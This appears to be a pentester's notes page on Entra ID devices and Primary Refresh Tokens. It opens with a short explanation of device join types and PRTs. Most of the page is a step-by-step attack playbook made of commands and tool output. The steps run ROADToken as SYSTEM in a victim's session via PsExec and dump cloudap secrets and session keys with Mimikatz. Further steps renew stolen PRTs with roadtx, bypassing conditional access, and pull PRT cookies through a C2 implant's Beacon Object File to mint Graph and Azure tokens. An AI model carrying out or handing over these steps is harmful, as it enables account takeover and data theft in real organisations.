---
title: "Entra ID Devices & Primary Refresh Tokens"
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/lateral-movement/entra-id-devices-and-primary-refresh-tokens
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

There are three types of device identities:

1. **Microsoft Entra join**

These are organization owned devices and heavily managed using Intune. Only Windows 11, 10 and Server 2019 machines running on Azure. These can be accessed using Azure AD accounts.

1. **Microsoft Entra registration**

These can be used owned (BYOD) or organization owned. These are lightly managed. Can be Windows 10 or newer, macOS, Ubuntu and mobile devices.

1. **Microsoft Entra hybrid join**

Organization owned devices joined to on-premise AD and registered with Entra ID. All supported Windows Desktops en server version

<div align="left"><figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FbakNljTwWcP6wrCCLtIh%2Fazure-ad-joined-device.png?alt=media&amp;token=27805f60-ba42-4e94-a917-e1d4445bb428" alt="" width="313"><figcaption></figcaption></figure></div>

### Primary Refresh Token

PRT is a special refresh token used for single sign-on. (SSO). It can be used to obtain access and refresh tokens to any application. It is issued to a user for a specific device. It is valid for **90** days and continuously renewed.&#x20;

**CloudAP SSP** on Windows devices requests and caches a PRT on a device.

The idea of SSO is that when you have a Entra ID joined device, you want to be able to access any application without having to provide credentials again

**MFA & PRT**

If a PRT is MFA-based (Windows Hello or Account managed), then the claim is transferred to app tokens to prevent MFA challenge for every application. This means that if you RDP into a machine, it is not MFA based and the claim is not transferred.

### Extract the PRT (Pass-the-PRT)

If we have access to a PRT, it is possible to request access tokens for any application. First check if there is a user AzureAD\username

```powershell
Get-Process -IncludeUserName
```

Using ROADToken:

```powershell
ROADToken.exe <nonce>
```

Request Nonce:

```powershell
$TenantId = "2d50cb29-5f7b-48a4-87ce-xxxx"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
$Params = @{
"URI" = $URL
"Method" = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

Next, run the following command to execute from system privileges in the session of the Azure AD user ROADToken.exe:

```powershell
Invoke-Command -Session $infraadminsrv -ScriptBlock{C:\Users\Public\student60\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student60\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student60\ROADToken.exe AwABEgEAAAADAOz_BQD0_yt2x3cdZplKFPI7ne9soLemwZfxfXDveVCG1B3Zw_irkrK0oTfhPUHZTp0RhL9nrFgBxb3GuXd1jf2v83BptRYgAA > C:\Users\Public\student60\PRT.txt"}
```

AADInternals

```powershell
Get-AADIntUserPRTToken
```

Mimikatz

```
Sekurlsa::cloudap
```

### Mimikatz extract PRT, sessionkey and renew using Roadtx

First using mimikatz cloudap, extract the key value and the PRT itself:

```
Sekurlsa::cloudap
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FDokpv1wfMielMhM1O9xy%2Fimage.png?alt=media&amp;token=3da36df5-0a23-4521-b7eb-9c8eda76d3af" alt=""><figcaption></figcaption></figure>

Copy the key value and PRT. Next, use `dpapi`to extract the session key:

```
dpapi::cloudapkd /keyvalue:<VALUE> /unprotect
```

Finally, use roadtx to renew and save the PRT:

```powershell
roadtx prt -a renew --prt <PRT> --prt-sessionkey <SESSION-KEY>
```

When a PRT is renewed conditional access is **NOT** checked

Now we can request a access token for azure resource manager:

```powershell
roadtx prtauth -c azps -r azrm --tokens-stdout
```

Or for MSGraph:

```powershell
roadtx prtauth -c azps -r msgraph --tokens-stdout
```

Or open a browser with the token already in place:

```powershell
roadtx browserprtauth -url https://portal.azure.com
```

### Extract PRT using BOF

When you have a implant using Cobalt Strike or any other C2 that can run BOF (Beacon Object Files), we can try to extract the PRT if the device is managed. For this, you will not need local admin. This was also tested against a device with the TPM active.

[This BOF](https://github.com/kozmer/aad-bofs/tree/main/request_aad_prt) obtains an AAD PRT for a user who is signed into Windows with their AAD credentials on a domain-joined machine. With this PRT, the resulting `x-ms-RefreshTokenCredential JWT` can then be used to authenticate to AAD on behalf of that user, for example with [ROADtools](https://github.com/dirkjanm/ROADtools). This proof-of-concept, originally inspired by [Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/), has been modified to pre-generate the nonce and retrieve a PRT all in one, rather than relying on roadrecon to retrieve it and then using that nonce to request a PRT.

#### Steps

1. First clone <https://github.com/kozmer/aad-bofs/tree/main/request_aad_prt>
2. Compile using `make`
3. Load BOF

```shellscript
[17/05/2026 15:20:57] (finished) operator > exec_bof
[*] Running BOF with name "request_aad_prt.x64.o"

[+] Starting AAD PRT request process
[+] Response size: 39412
[+] Starting PRT request with nonce
[+] Found 3 cookies:
Cookie 1:
  Name: x-ms-DeviceCredential
  Data: eyJhbGciOiJS<snip>4uxiG-A; path=/; domain=login.microsoftonline.com; secure; httponly
  Flags: 0x2040
  P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
Cookie 2:
  Name: x-ms-RefreshTokenCredential
  Data: eyJrZGZf<snip>gms-IlY; path=/; domain=login.microsoftonline.com; secure; httponly
  Flags: 0x2040
  P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
Cookie 3:
  Name: x-ms-DeviceCredential1
  Data: eyJ4NWMiO<snip>3ycSw; path=/; domain=login.microsoftonline.com; secure; httponly
  Flags: 0x2040
  P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
[+] AAD PRT request completed
```

This will give you the PRT cookie. Copy the value and use [roadrecon](https://github.com/dirkjanm/roadtools) to get a new access token.

```shellscript
$ roadrecon auth --prt-cookie "<PRT-cookie>"

Tokens were written to .roadtools_auth
```

Now we will use the following token to get an access token for Microsoft Graph:

```
$ roadtx refreshtokento -r https://graph.microsoft.com
Requesting token for resource https://graph.microsoft.com
Tokens were written to .roadtools_auth
```

Now we can query the Graph API:

```shellscript
roadtx graphrequest https://graph.microsoft.com/v1.0/me
```
